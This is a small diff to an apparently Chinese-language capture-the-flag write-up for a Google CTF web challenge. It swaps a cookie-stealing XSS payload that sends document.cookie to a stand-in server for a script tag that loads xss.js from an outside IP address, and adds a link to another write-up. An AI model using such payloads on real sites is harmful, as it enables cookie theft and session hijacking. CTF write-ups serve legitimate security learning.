@@ -24,6 +24,7 @@
       > Your message to the admins is as follows:
       > !!! Expecting to find '<script src=' in your input -- please re-read the level challenge.
 
-    - So赤果果的提示，构造playload `<script src="http://yourwebserver?cookie=+'document.cookie'`
+    - So赤果果的提示，构造playload `<script src="http://104.131.23.191/xss.js"></script>`
 
+    - [Google CTF – Web 1 – Wallowing Wallabies – Part One](http://buer.haus/2016/05/01/google-ctf-web-1-wallowing-wallabies-part-one/)
 2.
